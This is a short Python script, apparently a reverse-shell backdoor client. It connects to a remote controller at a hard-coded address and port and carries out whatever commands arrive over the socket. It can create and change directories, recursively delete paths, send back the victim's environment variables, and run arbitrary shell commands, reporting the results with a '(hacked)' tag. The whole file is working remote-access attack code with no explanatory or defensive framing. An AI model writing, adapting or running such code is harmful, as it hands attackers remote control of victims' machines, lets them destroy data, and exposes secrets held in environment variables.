import socket
import sys
import os
import subprocess
import pprint
import shutil

s = socket.socket()

host = "192.168.1.2"
port = 9998

s.connect((host,port))

while True:
    d = 0
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'md':
        os.mkdir(data[3:].decode("utf-8"))
        

    elif data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
        

    elif data[:].decode("utf-8") == "dir":
        cw = os.getcwd()
        s.send(str.encode(cw,"utf-8"))

    elif data[:].decode("utf-8") == "name":
        name = os.name
        s.send(str.encode(name,"utf-8"))

    elif data[:6].decode("utf-8") == "remove":
        p = os.path.join(data[7:].decode("utf-8"))
        shutil.rmtree(p)
        s.send(str.encode("Target file deleted"))
        
    #elif data[:3].decode("utf-8") == "del":
     #   s.send(str.encode("Enter target file","utf-8"))
      #  filename = input()
       # p = os.path.join(data[4:].decode("utf-8"),filename)
       # os.remove(p)
       # s.send(str.encode("Target file deleted"))

    elif data[:].decode("utf-8") == "inform":
        env_var = os.environ
        res = str(env_var)
        s.send(res.encode("utf-8"))
        d = 1
        #pprint.pprint(dict(env_var),width = 1)
        #s.send(str.encode(res),"utf-8")

    elif data[:].decode("utf-8") == "cd..":
        pass
        


    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell = True,stdout = subprocess.PIPE,stdin = subprocess.PIPE)
        output_byte = cmd.stdout.read()
        output_str = str(output_byte,"utf-8")
        cwd = os.getcwd() + ">"
        s.send(str.encode("(hacked) " + output_str + cwd))
        if d == 1:
            pass
